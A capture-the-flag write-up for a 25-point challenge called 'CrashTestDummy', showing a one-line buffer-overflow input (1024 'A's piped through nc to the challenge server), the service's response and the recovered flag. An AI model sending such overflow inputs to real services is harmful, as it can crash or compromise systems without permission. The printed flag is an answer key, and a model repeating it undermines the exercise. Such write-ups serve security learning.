# CrashTestDummy - Points: 25

### Description:

Can you learn a lot from a dummy? Connect with nc challenge.acictf.com 31795 and recover the flag.

### Hints

 - Open up and say AAAAAH

### Solution

I literally just gave it a ton of `A`s.

    shombo$ python -c "print 'A' * 1024" | nc challenge.acictf.com 31795

    Source: https://www.adcouncil.org/Our-Campaigns/The-Classics/Safety-Belt-Education

    The single most effective protection against death and serious injury 
    in a car crash is the safety belt. Since Vince & Larry, the Crash 
    Test Dummies, were introduced to the American public in 1985, safety 
    belt usage has increased from 14% to 79%, saving an estimated 85,000 
    lives, and $3.2 billion in costs to society. The campaign tagline, 
    "You Could Learn A Lot From a Dummy," as well as the crash test dummies 
    themselves, was retired in 1999, when the U.S. Department of 
    Transportation revised the campaign.


    Have you seen these commericals? You made me crash!


### Flag: `ACI{Buffers_are_made_to_be_Overflow__e2f3c737}`

